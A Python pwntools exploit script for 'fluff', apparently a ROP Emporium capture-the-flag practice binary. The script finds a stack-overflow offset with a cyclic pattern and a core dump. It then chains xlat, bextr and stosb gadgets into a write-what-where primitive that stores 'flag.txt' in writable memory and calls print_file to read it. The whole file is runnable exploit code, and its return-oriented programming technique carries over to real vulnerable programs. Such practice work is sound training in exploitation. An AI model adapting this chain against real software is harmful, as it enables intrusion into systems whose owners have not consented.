#!/usr/bin/env python3
from pwn import *

# set up context
elf = context.binary = ELF('fluff')
context.log_level = 'debug'

# find offset
io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
offset = core.read(stack, 4)

# craft payload
last_al = 0xb # return value of puts() which is strlen("Thank you!\n")
def write_byte(addr: int, val: int) -> list[object]:
    '''
    Write-what-where gadget

    Stack layout:
    ---- HIGH ----

    val     -- rdi = addr
    gadget  -> pop rdi; ret; 

    gadget  -> xlat BYTE PTR ds:[rbx]

    val     -- rcx = val_addr - 0x3ef2 - last_al
    val     -- rdx = (64 << 8)
    gadget  -> pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
    ---- LOW  ----
    '''
    global last_al

    val &= 0xff # make sure val is a single byte
    val_addr = next(elf.search(val.to_bytes(1, byteorder='little'))) - 0x3ef2 - last_al
    last_al = val
    
    return [
        0x000000000040062a, # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
        64 << 8,            # rdx[7:0] = start bit (0); rdx[15:8] = how many bits to read from rcx
        val_addr,           # modified address of the val byte

        0x0000000000400628, # xlat BYTE PTR ds:[rbx]; ret

        0x00000000004006a3, # pop rdi; ret; 
        addr,               # rdi = addr

        0x0000000000400639  # stosb byte ptr [rdi], al; ret; 
    ]


def write_bytes(addr: int, bs: bytes) -> list[object]:
    return [write_byte(addr + i, b) for i, b in enumerate(bs)]


str_addr = 0x00601028
payload = flat(
    { offset: write_bytes(str_addr, b'flag.txt') },
    0x00000000004006a3, # pop rdi; ret; 
    str_addr,
    elf.symbols.print_file
)

open('payload.bin', 'wb').write(payload)

# send payload
io = process(elf.path)
io.recvuntil(b'> ')
io.sendline(payload)
io.recvuntil(b'Thank you!\n')
print(io.recvline().decode('utf-8'))
